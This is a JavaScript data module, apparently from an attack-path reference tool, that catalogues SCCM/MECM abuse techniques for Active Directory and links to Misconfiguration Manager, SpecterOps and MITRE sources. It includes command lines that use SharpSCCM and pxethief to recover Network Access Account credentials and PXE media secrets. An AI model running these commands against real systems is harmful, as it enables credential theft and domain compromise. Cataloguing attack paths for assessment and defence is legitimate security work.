import { mitre, r } from '../lib.js';

/** SCCM / MECM (Configuration Manager) abuse (web-verified, Misconfiguration Manager taxonomy). */
/** @type {import('../schema.js').TechniqueNodeDef[]} */
export const adSccmNodes = [
  {
    id: 'sccm-recon',
    ...
    references: [{ label: 'Misconfiguration Manager, RECON-1', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/RECON/RECON-1/recon-1_description.md' }, { label: 'Misconfiguration Manager, RECON-2 (SMB Enumeration)', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/RECON/RECON-2/recon-2_description.md' }],
  ...
  },
  {
    ...
    commands: [
      { label: 'Recover NAA creds from an already-enrolled client (CRED-2, reuses this host\'s registered identity)', code: r`SharpSCCM.exe get secrets -mp <MANAGEMENT_POINT> -sc <SITE_CODE>`, lang: 'powershell' },
      { label: 'Register a rogue client first, then recover NAA creds (CRED-2; -u expects a machine account ending in $)', code: r`SharpSCCM.exe get secrets -mp <MANAGEMENT_POINT> -sc <SITE_CODE> -r <device> -u <COMPUTER$> -p <password>`, lang: 'powershell' },
    ...
    requires: ['A domain machine account, or a domain user able to create one (MachineAccountQuota > 0, default 10) to register a rogue client (CRED-2); or local admin on a client (CRED-3)', 'SCCM site using NAAs with defaults'],
  ...
  },
  {
    ...
    commands: [
      { label: 'Auto-discover & download PXE media (auto-tries a blank password)', code: r`python3 pxethief.py 1`, lang: 'bash' },
      { label: 'Print the crackable hash from the downloaded media variables file', code: r`python3 pxethief.py 5 <media-variables-file> > pxe.hash`, lang: 'bash' },
      ...
      { label: 'Decrypt the media variables to extract secrets (once the password is known or blank)', code: r`python3 pxethief.py 3 <media-variables-file>`, lang: 'bash' },
    ],
    references: [{ label: 'Misconfiguration Manager, CRED-1 (PXE)', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md' }, { label: 'Christopher Panayi, Pulling Passwords out of Configuration Manager (DEF CON 30)', url: 'https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Christopher%20Panayi%20-%20Pulling%20Passwords%20out%20of%20Configuration%20Manager%20Practical%20Attacks%20against%20Microsofts%20Endpoint%20Management%20Software.pdf' }],
  ...
  },
  {
    ...
    references: [
      { label: 'SpecterOps, SCCM Hierarchy Takeover', url: 'https://specterops.io/blog/2023/09/25/sccm-hierarchy-takeover/' },{ label: 'Misconfiguration Manager, TAKEOVER-1', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md' }],
  ...
  },
  {
    ...
    mitre: mitre('T1072'),
    references: [{ label: 'MITRE T1072, Software Deployment Tools', url: 'https://attack.mitre.org/techniques/T1072/' }, { label: 'SpecterOps, SharpSCCM Documentation', url: 'https://docs.specterops.io/sharpsccm-docs' }, { label: 'SpecterOps, Lateral Movement without Lateral Movement (ConfigMgr)', url: 'https://specterops.io/blog/2023/11/07/lateral-movement-without-lateral-movement-brought-to-you-by-configmgr/' }, { label: 'Misconfiguration Manager, EXEC-1 (Application deployment)', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/EXEC/EXEC-1/exec-1_description.md' }],
...
/** @type {import('../schema.js').AttackEdge[]} */
export const adSccmEdges = [
  ...
  { source: 'sccm-relay-mssql', target: 'domain-admin', label: 'SCCM Full Admin' },
